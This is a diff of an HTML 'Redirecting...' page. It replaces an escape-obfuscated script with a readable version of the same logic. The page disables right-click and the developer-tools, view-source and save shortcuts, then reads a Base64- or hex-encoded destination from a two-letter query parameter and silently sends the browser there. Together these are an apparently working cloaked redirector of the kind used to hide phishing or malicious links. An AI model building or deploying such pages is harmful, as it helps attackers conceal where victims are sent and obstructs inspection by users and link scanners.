@@ -1,2 +1,72 @@
-<!DOCTYPE html> <html><head><meta charset="UTF-8"><title>Redirecting...</title> <script>\u0064o\u0063um\u0065nt.a\u0064d\u0045v\u0065ntL\u0069\u0073\u0074\u0065\u006eer('c\157\x6etex\x74me\x6eu',\u0065=>\u0065.\u0070reve\u006et\u0044\u0065fa\u0075lt());\u0064o\u0063ument.o\u006ek\u0065\u0079down=function(\u0065){if(\u0065.k\u0065yC\u006f\u0064\u0065===123||(\u0065.c\u0074rlKey&&e.\u0073\u0068if\u0074\u004b\u0065y&&(e.k\u0065\u0079\u0043\u006fde===73||\u0065.\u006b\u0065yC\u006fde===74))||(\u0065.ctrlKey&&(e.\u006bey\u0043od\u0065===83||e.keyCode===85||\u0065.keyCod\u0065===65))){return false;}};</script> <script>wind\u006f\u0077.onload=function(){const pa\u0072a\u006d\u0073=new U\u0052\u004c\u0053\u0065archPara\u006ds(window.lo\u0063\u0061t\u0069o\u006e.\u0073e\u0061rc\u0068);l\u0065\u0074 \u0065\u006e\u0063\u006fd\u0065\u0064Value='';for(const[key,value]of \u0070arams.entr\u0069\u0065\u0073()
-){if(\u006b\u0065\u0079.\u006ce\u006eg\u0074h===2){encodedVal\u0075e=\u0076a\u006cue;break;}}if(\u0065nco\u0064edValu\u0065){try{const decod\u0065dU\u0052\u004c=a\u0074o\u0062(en\u0063o\u0064e\u0064V\u0061lue);l\u0065t f\u0069na\u006cURL=d\u0065co\u0064\u0065d\u0055RL;if(!/^https?:\/\//i.\u0074est(\u0066i\u006ealURL)){f\u0069nalURL='htt\160\x3a//'+final\u0055RL;}\u0077\u0069\u006e\u0064\u006fw.lo\u0063ation.href=f\u0069na\u006c\u0055RL;}catch(e){\u0077indow.\u006cocat\u0069o\u006e.\u0068\u0072e\u0066='a\142\157ut:\u0062lank';}}else{\u0077indo\u0077.\u006co\u0063ation.hr\u0065f='ab\x6f\165t:\x62l\141nk';}};</script> </head><body></body></html>
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <script>
+    // Disable right-click and inspect shortcuts
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.onkeydown = function(e) {
+      if (
+        e.keyCode === 123 || // F12
+        (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || // Ctrl+Shift+I/J
+        (e.ctrlKey && (e.keyCode === 83 || e.keyCode === 85 || e.keyCode === 65)) // Ctrl+S/U/A
+      ) {
+        return false;
+      }
+    };
+  </script>
+
+  <script>
+    function hexToString(hex) {
+      try {
+        let str = '';
+        for (let i = 0; i < hex.length; i += 2) {
+          str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+        }
+        return str;
+      } catch {
+        return '';
+      }
+    }
+
+    window.onload = function () {
+      const params = new URLSearchParams(window.location.search);
+      let encodedValue = '';
+
+      for (const [key, value] of params.entries()) {
+        if (key.length === 2) {
+          encodedValue = value;
+          break;
+        }
+      }
+
+      if (encodedValue) {
+        let decodedURL = '';
+
+        // Try Base64 decode
+        try {
+          decodedURL = atob(encodedValue);
+        } catch (e) {
+          // If Base64 fails, try HEX decode
+          decodedURL = hexToString(encodedValue);
+        }
+
+        if (decodedURL) {
+          if (!/^https?:\/\//i.test(decodedURL)) {
+            decodedURL = 'https://' + decodedURL;
+          }
+          window.location.href = decodedURL;
+        } else {
+          window.location.href = 'about:blank';
+        }
+      } else {
+        window.location.href = 'about:blank';
+      }
+    };
+  </script>
+</head>
+<body>
+</body>
+</html>
+
